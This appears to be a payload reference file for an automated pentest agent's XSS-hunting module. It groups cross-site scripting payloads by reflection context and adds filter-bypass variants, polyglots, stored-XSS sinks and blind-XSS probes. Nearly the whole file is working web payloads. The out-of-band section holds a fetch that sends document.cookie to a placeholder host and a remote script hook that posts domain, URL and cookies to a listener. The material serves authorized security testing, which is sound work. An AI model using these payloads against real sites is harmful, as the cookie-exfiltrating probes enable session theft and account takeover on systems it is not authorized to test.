# payloads — xss-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Mestre de Vulnerabilidades XSS_ Detecção e Mitigação.md` (Section 5: PAYLOADS / PROBES)

Payloads are grouped by reflection context. Before sending any payload,
identify whether the input reflects into HTML body, an attribute, a URL
attribute, a `<script>` block, or a JavaScript event handler — different
contexts require different breakouts.

---

## Step 0 — Probe the Reflection Context

```
XSS_PROBE_ABC123
```

Submit the alphanumeric string and `grep` the response for its position.
Determine surrounding characters. That tells you what syntactic break
you need.

---

## HTML Body Context

When the probe appears between tags: `<div>PROBE_HERE</div>`.

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<details open ontoggle=alert(1)>
```

### Tag filter bypass

```html
<SVG ONLOAD=alert(1)>                    # case variation
<scr<script>ipt>alert(1)</scr</script>ipt>  # nested tag stripping
<svg><script>alert(1)</script></svg>
<math><style><img src=x onerror=alert(1)></style></math>
```

---

## HTML Attribute Context

When the probe lands inside an attribute value: `<input value="PROBE">`.

### Quote breakout + event handler

```
"><script>alert(1)</script>
" onfocus="alert(1)" autofocus x="
" onmouseover="alert(1)" x="
' onfocus='alert(1)' autofocus x='
```

### No quotes available — use a space / greater-than

```
 onfocus=alert(1) autofocus
/><svg onload=alert(1)>
```

---

## JavaScript Context (inside `<script>`)

When the probe appears inside a script block: `<script>var x = "PROBE";</script>`.

```
";alert(1);//
';alert(1);//
\";alert(1);//
</script><script>alert(1)</script>
```

The `</script>` closer also works from inside a JS string — browsers
tokenize by `</script>` regardless of string context.

---

## Event Handler / `onxxxx=` Context

The value lands in an attribute that's already an event handler:
`<div onclick="doThing('PROBE')">`.

```
');alert(1);//
';alert(1);//
```

No tag break needed — just close the JS function call.

---

## URL / href / src Context

The value lands in an attribute expecting a URL:
`<a href="PROBE">`.

```
javascript:alert(1)
javascript:alert`1`
JaVaScRiPt:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)           # IE legacy only
```

---

## CSS Context

The probe lands in a `style` attribute or `<style>` block.

```
expression(alert(1))          # IE legacy
background:url("javascript:alert(1)")   # Old IE; modern browsers block this
</style><script>alert(1)</script>
```

---

## Polyglot Probes

Single payload that fires across multiple contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Another classic:

```html
"'--></style></script><script>alert(String.fromCharCode(88,83,83))</script>
```

---

## Filter Evasion

### Mixed case

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### Unicode / HTML entities (inside attributes that get HTML-decoded)

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="jav&#x09;ascript:alert(1)">x</a>      <!-- tab break inside -->
```

### No parentheses (`(` / `)` blocked)

```html
<img src=x onerror=alert`1`>
<svg onload=alert`1`>
<img src=x onerror="throw onerror=alert,1">
```

### No quotes (`"` / `'` blocked)

```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg><script>alert(/XSS/.source)</script></svg>
```

### No spaces

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

---

## Stored XSS — Common Persistence Sinks

Places where persisted input becomes a stored-XSS delivery vector:

- Comment sections, forum posts, chat messages
- User profile "display name", "about" / "bio", avatar URL
- Filename of an uploaded attachment (rendered later by admin UI)
- Metadata fields on documents (`<title>`, image EXIF)
- Error messages written into logs that are later rendered in an admin dashboard
- Webhook payload fields that get logged and rendered
- CSV / XLSX export cells (formula injection is adjacent — `=HYPERLINK(...)`)

Send a unique probe (`XSS-{random-uuid}`) to each candidate field, then
browse every authenticated view of that object (admin UI, mobile app,
export) with DevTools open.

---

## Accessible / Non-JS-Alert Probes

Some testers prefer non-`alert` probes because alerts are blocked in
headless browsers and sandboxes. Safer, still-observable options:

```html
<img src=x onerror="document.title='XSS-CONFIRMED'">
<svg onload="fetch('https://OOB/xss?c='+document.cookie)">
<script>document.body.dataset.xss='yes'</script>
```

Note: exfiltrating the session cookie (`document.cookie`) is a
confirmation-only probe — do NOT use a real victim's cookie in a
pentest report; scrub or replace with `[REDACTED]`.

---

## Blind XSS Probes (Stored, No Same-User Delivery)

When the injection fires only in an admin / backend UI you cannot see:

```html
<script src="https://OOB/blind-xss-hook.js"></script>
```

Host `blind-xss-hook.js` as a generic callback — POST `document.domain`,
`document.URL`, `document.cookie` to an OOB listener. Frameworks like
XSS Hunter (the public service) and `bxss` automate this.

Record domain scope in `security-scope.yaml` before using OOB callbacks.

---

## DOM Context (delegate to `dom-xss-hunter`)

If the input source is `location.hash`, `document.URL`, `postMessage`,
`window.name`, or `document.referrer`, delegate to `dom-xss-hunter` —
the context analysis is different (client-side sinks: `innerHTML`,
`document.write`, `eval`, `setTimeout(string)`, `Function(string)`).
